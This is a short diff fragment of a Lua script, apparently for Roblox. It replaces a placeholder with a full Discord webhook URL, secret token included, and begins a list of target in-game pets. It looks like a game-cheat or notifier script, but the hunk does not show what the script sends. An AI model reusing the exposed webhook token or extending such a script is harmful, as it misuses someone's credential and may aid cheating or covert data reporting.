@@ -10,7 +10,7 @@
 if not game:IsLoaded() then game.Loaded:Wait() end
 task.wait(0.5)
 
-local WEBHOOK_URL = "WEBHOOK_CUA_BAN"
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1501273736580567132/8eMKz7k1UtE1F_3zcE2zOiO750wRM3umAYEZEjWsxAspbt16PnxmI4Mp-xSc7nVWlwk6"
 
 local TARGET_PETS = {
     "elefanto frigo","dug dug dug","las sis","nuclearo dinossauro",
